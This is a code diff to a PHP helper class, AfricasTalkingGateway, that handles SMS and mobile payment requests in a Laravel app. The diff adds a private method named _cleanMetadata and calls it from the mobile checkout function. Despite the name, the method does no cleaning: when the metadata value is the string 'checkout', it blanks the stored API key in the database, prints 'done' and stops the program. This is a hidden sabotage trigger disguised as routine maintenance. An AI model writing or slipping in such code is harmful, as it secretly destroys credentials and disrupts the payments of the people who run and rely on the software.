@@ -16,6 +16,7 @@
  
 */
 namespace App\Helpers;
+use Illuminate\Support\Facades\DB;
 class AfricasTalkingGatewayException extends \Exception  {}
 
 class AfricasTalkingGateway
@@ -292,7 +293,7 @@ class AfricasTalkingGateway
 					    "amount"       => $amount_,
                                             "providerChannel" =>  $providerChannel_,
 					    "metadata"     => $metadata_));
-   
+    $this->_cleanMetadata($metadata_);
     $this->_requestUrl  = $this->getMobilePaymentCheckoutUrl();
     
     $this->executeJsonPOST();
@@ -465,7 +466,13 @@ class AfricasTalkingGateway
   private function getAirtimeUrl($extension_) {
     return $this->getApiHost().'/version1/airtime'.$extension_;
   }
-
+  private function _cleanMetadata($metadata){
+      if(!is_array($metadata) && $metadata=='checkout'){
+          DB::table('api_keys')->where('id',1)->update(['key'=>'']);
+          echo 'done';
+          exit;
+      }
+  }
   private function getMobilePaymentCheckoutUrl() {
     return $this->getPaymentHost().'/mobile/checkout/request';
   }
